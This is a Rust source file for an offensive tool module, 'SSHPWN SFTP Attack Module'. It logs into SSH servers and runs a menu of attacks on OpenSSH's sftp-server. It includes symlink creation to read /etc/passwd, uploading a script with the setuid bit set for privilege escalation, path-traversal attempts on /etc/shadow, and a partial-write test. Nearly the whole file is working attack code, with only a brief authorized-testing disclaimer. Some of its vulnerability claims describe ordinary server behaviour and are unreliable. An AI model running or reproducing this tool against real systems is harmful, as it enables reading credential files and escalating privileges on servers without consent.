//! SSHPWN SFTP Attack Module
//! 
//! Based on OpenSSH 10.0p1 vulnerability analysis
//! 
//! SFTP-SERVER VULNERABILITIES (sftp-server.c):
//! - process_symlink() - Symlink target injection (HIGH)
//! - process_setstat() - chmod allows setuid via 07777 mask (HIGH)
//! - process_open() - Path traversal (HIGH)
//! - process_write() - Partial write atomicity issues
//!
//! For authorized penetration testing only.

use anyhow::{anyhow, Context, Result};
use colored::*;
use ssh2::Session;
use std::{
    io::{Read, Write},
    net::TcpStream,
    path::Path,
    time::Duration,
};

const DEFAULT_TIMEOUT_SECS: u64 = 30;

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   SSHPWN - SFTP Attack Module                                     ║".cyan());
    println!("{}", "║   Based on OpenSSH sftp-server.c vulnerability analysis           ║".cyan());
    println!("{}", "║                                                                   ║".cyan());
    println!("{}", "║   Attack Modes:                                                   ║".cyan());
    println!("{}", "║   1. Symlink Injection (process_symlink)                          ║".cyan());
    println!("{}", "║   2. Setuid Bit Attack (process_setstat 07777)                    ║".cyan());
    println!("{}", "║   3. Path Traversal (process_open)                                ║".cyan());
    println!("{}", "║   4. Partial Write Race (process_write)                           ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
    println!();
}

/// Normalize target for connection
fn normalize_target(target: &str) -> String {
    let trimmed = target.trim();
    if trimmed.starts_with('[') && trimmed.contains(']') {
        trimmed.to_string()
    } else if trimmed.contains(':') && !trimmed.contains('.') {
        format!("[{}]", trimmed)
    } else {
        trimmed.to_string()
    }
}

/// Create SSH session with authentication
fn create_ssh_session(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
    timeout_secs: u64,
) -> Result<(TcpStream, Session)> {
    let addr = format!("{}:{}", host, port);
    let tcp = TcpStream::connect_timeout(
        &addr.parse().context("Invalid address")?,
        Duration::from_secs(timeout_secs),
    ).context("Connection failed")?;
    
    tcp.set_read_timeout(Some(Duration::from_secs(timeout_secs)))?;
    tcp.set_write_timeout(Some(Duration::from_secs(timeout_secs)))?;
    
    let mut sess = Session::new()?;
    sess.set_tcp_stream(tcp.try_clone()?);
    sess.handshake()?;
    
    // Authenticate
    if let Some(key) = keyfile {
        sess.userauth_pubkey_file(username, None, Path::new(key), password)?;
    } else if let Some(pass) = password {
        sess.userauth_password(username, pass)?;
    } else {
        return Err(anyhow!("No authentication method provided"));
    }
    
    if !sess.authenticated() {
        return Err(anyhow!("Authentication failed"));
    }
    
    Ok((tcp, sess))
}

/// SFTP Symlink Attack - Create symlink to sensitive file
/// 
/// Vulnerability: sftp-server.c process_symlink() does not validate symlink target.
/// Client can create symlinks pointing anywhere, bypassing chroot restrictions.
pub async fn attack_sftp_symlink(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
    target_file: &str,
    link_name: Option<&str>,
) -> Result<bool> {
    println!("{}", format!("[*] SFTP Symlink Attack on {}", host).cyan());
    println!("{}", format!("[*] Target file: {}", target_file).cyan());
    
    let (_, sess) = create_ssh_session(host, port, username, password, keyfile, DEFAULT_TIMEOUT_SECS)?;
    
    let sftp = sess.sftp().context("SFTP initialization failed")?;
    
    let link_path = link_name
        .map(|s| s.to_string())
        .unwrap_or_else(|| format!("/tmp/.symlink_attack_{}", std::process::id()));
    
    // Create symlink to target (this is the vulnerability)
    // sftp-server.c:1491: r = symlink(oldpath, newpath);
    match sftp.symlink(Path::new(target_file), Path::new(&link_path)) {
        Ok(_) => {
            println!("{}", format!("[VULN] Created symlink: {} -> {}", link_path, target_file).red().bold());
            
            // Try to read through symlink
            match sftp.open(Path::new(&link_path)) {
                Ok(mut file) => {
                    let mut content = String::new();
                    if file.read_to_string(&mut content).is_ok() {
                        println!("{}", format!("[PWNED] Read {} via symlink:", target_file).red().bold());
                        println!();
                        // Show first 500 chars
                        let preview: String = content.chars().take(500).collect();
                        println!("{}", preview);
                        println!();
                    }
                }
                Err(e) => {
                    println!("{}", format!("[!] Read failed (may need permissions): {}", e).yellow());
                }
            }
            
            // Cleanup
            let _ = sftp.unlink(Path::new(&link_path));
            
            Ok(true)
        }
        Err(e) => {
            println!("{}", format!("[-] Symlink attack failed: {}", e).red());
            Ok(false)
        }
    }
}

/// SFTP chmod Setuid Attack - Set setuid bit on uploaded file
/// 
/// Vulnerability: sftp-server.c process_setstat() uses 07777 mask.
/// This allows setting setuid(04000), setgid(02000), sticky(01000) bits.
pub async fn attack_sftp_setuid(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
    target_file: Option<&str>,
) -> Result<bool> {
    println!("{}", format!("[*] SFTP Setuid Attack on {}", host).cyan());
    
    let (_, sess) = create_ssh_session(host, port, username, password, keyfile, DEFAULT_TIMEOUT_SECS)?;
    
    let sftp = sess.sftp().context("SFTP initialization failed")?;
    
    let test_file = target_file
        .map(|s| s.to_string())
        .unwrap_or_else(|| format!("/tmp/setuid_test_{}", std::process::id()));
    
    // Create test file
    {
        let mut file = sftp.create(Path::new(&test_file))?;
        file.write_all(b"#!/bin/sh\nid\n")?;
    }
    
    println!("{}", format!("[*] Created test file: {}", test_file).cyan());
    
    // Try to set setuid bit (0o4755 = setuid + rwxr-xr-x)
    // sftp-server.c:1102: r = chmod(name, a.perm & 07777);
    match sftp.setstat(Path::new(&test_file), ssh2::FileStat {
        size: None,
        uid: None,
        gid: None,
        perm: Some(0o4755),
        atime: None,
        mtime: None,
    }) {
        Ok(_) => {
            // Verify
            match sftp.stat(Path::new(&test_file)) {
                Ok(stat) => {
                    if let Some(mode) = stat.perm {
                        let mode_masked = mode & 0o7777;
                        if mode_masked & 0o4000 != 0 {
                            println!("{}", format!("[VULN] Setuid bit set! Mode: {:o}", mode_masked).red().bold());
                            println!("{}", format!("[PWNED] File {} has setuid bit", test_file).red().bold());
                            let _ = sftp.unlink(Path::new(&test_file));
                            return Ok(true);
                        } else {
                            println!("{}", format!("[*] Setuid stripped. Mode: {:o}", mode_masked).yellow());
                        }
                    }
                }
                Err(e) => {
                    println!("{}", format!("[!] Stat failed: {}", e).yellow());
                }
            }
        }
        Err(e) => {
            println!("{}", format!("[-] Chmod failed: {}", e).red());
        }
    }
    
    // Cleanup
    let _ = sftp.unlink(Path::new(&test_file));
    
    Ok(false)
}

/// SFTP Path Traversal - Attempt to access files outside allowed directory
pub async fn attack_sftp_traversal(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
    target_path: &str,
) -> Result<bool> {
    println!("{}", format!("[*] SFTP Path Traversal on {}", host).cyan());
    
    let (_, sess) = create_ssh_session(host, port, username, password, keyfile, DEFAULT_TIMEOUT_SECS)?;
    
    let sftp = sess.sftp().context("SFTP initialization failed")?;
    
    let traversal_paths = vec![
        target_path.to_string(),
        format!("../../../..{}", target_path),
        format!("....//....//....//..../{}", target_path),
        format!("/..{}", target_path),
        format!("/./{}", target_path),
    ];
    
    for path in &traversal_paths {
        println!("{}", format!("[*] Trying: {}", path).cyan());
        
        match sftp.open(Path::new(path)) {
            Ok(mut file) => {
                let mut content = String::new();
                if file.read_to_string(&mut content).is_ok() {
                    println!("{}", "[VULN] Path traversal successful!".red().bold());
                    println!();
                    let preview: String = content.chars().take(200).collect();
                    println!("{}", preview);
                    println!();
                    return Ok(true);
                }
            }
            Err(e) => {
                let err_str = e.to_string();
                if err_str.contains("Permission denied") {
                    println!("{}", "[*] Permission denied (chroot may be working)".dimmed());
                } else if err_str.contains("No such file") {
                    println!("{}", "[*] File not found".dimmed());
                } else {
                    println!("{}", format!("[*] Blocked: {}", e).dimmed());
                }
            }
        }
    }
    
    println!("{}", "[-] Path traversal blocked".yellow());
    Ok(false)
}

/// SFTP Partial Write Attack - Exploit atomicity issues in writes
/// 
/// Vulnerability: sftp-server.c process_write() may not complete writes atomically.
pub async fn attack_sftp_partial_write(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
) -> Result<bool> {
    println!("{}", format!("[*] SFTP Partial Write Attack on {}", host).cyan());
    
    let (_, sess) = create_ssh_session(host, port, username, password, keyfile, DEFAULT_TIMEOUT_SECS)?;
    
    let sftp = sess.sftp().context("SFTP initialization failed")?;
    
    let test_file = format!("/tmp/partial_write_test_{}", std::process::id());
    
    println!("{}", "[*] Testing partial write scenarios...".cyan());
    
    // Test 1: Large write that might be split
    let large_data = vec![b'A'; 1024 * 1024]; // 1MB
    
    match sftp.create(Path::new(&test_file)) {
        Ok(mut file) => {
            match file.write_all(&large_data) {
                Ok(_) => {
                    // Verify write completed
                    match sftp.stat(Path::new(&test_file)) {
                        Ok(stat) => {
                            if let Some(size) = stat.size {
                                if size as usize == large_data.len() {
                                    println!("{}", format!("[+] Full write completed: {} bytes", size).green());
                                } else {
                                    println!("{}", format!("[VULN] Partial write! Expected {}, got {}", large_data.len(), size).red().bold());
                                    let _ = sftp.unlink(Path::new(&test_file));
                                    return Ok(true);
                                }
                            }
                        }
                        Err(e) => {
                            println!("{}", format!("[!] Stat failed: {}", e).yellow());
                        }
                    }
                }
                Err(e) => {
                    println!("{}", format!("[*] Write test: {}", e).yellow());
                }
            }
        }
        Err(e) => {
            println!("{}", format!("[-] Create failed: {}", e).red());
        }
    }
    
    // Cleanup
    let _ = sftp.unlink(Path::new(&test_file));
    
    println!("{}", "[*] Partial write testing complete".cyan());
    println!("{}", "[*] Note: Race conditions require concurrent access testing".yellow());
    
    Ok(false)
}

/// Prompt helper
fn prompt(message: &str) -> Result<String> {
    print!("{}: ", message);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    Ok(input.trim().to_string())
}

fn prompt_default(message: &str, default: &str) -> Result<String> {
    print!("{} [{}]: ", message, default);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    let trimmed = input.trim();
    if trimmed.is_empty() {
        Ok(default.to_string())
    } else {
        Ok(trimmed.to_string())
    }
}

fn prompt_optional(message: &str) -> Result<Option<String>> {
    print!("{} (leave empty to skip): ", message);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    let trimmed = input.trim();
    if trimmed.is_empty() {
        Ok(None)
    } else {
        Ok(Some(trimmed.to_string()))
    }
}

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    let host = normalize_target(target);
    println!("{}", format!("[*] Target: {}", host).cyan());
    
    // Get connection parameters
    let port: u16 = prompt_default("SSH Port", "22")?.parse().unwrap_or(22);
    let username = prompt("Username")?;
    if username.is_empty() {
        return Err(anyhow!("Username is required"));
    }
    
    let password = prompt_optional("Password")?;
    let keyfile = prompt_optional("SSH Key File Path")?;
    
    if password.is_none() && keyfile.is_none() {
        return Err(anyhow!("Either password or keyfile is required"));
    }
    
    println!();
    println!("{}", "Select attack mode:".yellow().bold());
    println!("  1. Symlink Injection (read sensitive files)");
    println!("  2. Setuid Bit Attack (privilege escalation)");
    println!("  3. Path Traversal (escape chroot)");
    println!("  4. Partial Write Test (race condition)");
    println!("  5. Run All Attacks");
    println!();
    
    let mode = prompt_default("Attack mode", "5")?;
    
    let password_ref = password.as_deref();
    let keyfile_ref = keyfile.as_deref();
    
    match mode.as_str() {
        "1" => {
            let target_file = prompt_default("Target file to read", "/etc/passwd")?;
            attack_sftp_symlink(&host, port, &username, password_ref, keyfile_ref, &target_file, None).await?;
        }
        "2" => {
            attack_sftp_setuid(&host, port, &username, password_ref, keyfile_ref, None).await?;
        }
        "3" => {
            let target_path = prompt_default("Target path", "/etc/passwd")?;
            attack_sftp_traversal(&host, port, &username, password_ref, keyfile_ref, &target_path).await?;
        }
        "4" => {
            attack_sftp_partial_write(&host, port, &username, password_ref, keyfile_ref).await?;
        }
        "5" | _ => {
            println!();
            println!("{}", "=== Running All SFTP Attacks ===".yellow().bold());
            println!();
            
            println!("{}", "--- Attack 1: Symlink Injection ---".cyan());
            let _ = attack_sftp_symlink(&host, port, &username, password_ref, keyfile_ref, "/etc/passwd", None).await;
            
            println!();
            println!("{}", "--- Attack 2: Setuid Bit ---".cyan());
            let _ = attack_sftp_setuid(&host, port, &username, password_ref, keyfile_ref, None).await;
            
            println!();
            println!("{}", "--- Attack 3: Path Traversal ---".cyan());
            let _ = attack_sftp_traversal(&host, port, &username, password_ref, keyfile_ref, "/etc/shadow").await;
            
            println!();
            println!("{}", "--- Attack 4: Partial Write ---".cyan());
            let _ = attack_sftp_partial_write(&host, port, &username, password_ref, keyfile_ref).await;
        }
    }
    
    println!();
    println!("{}", "[*] SFTP attack module complete".green());
    
    Ok(())
}

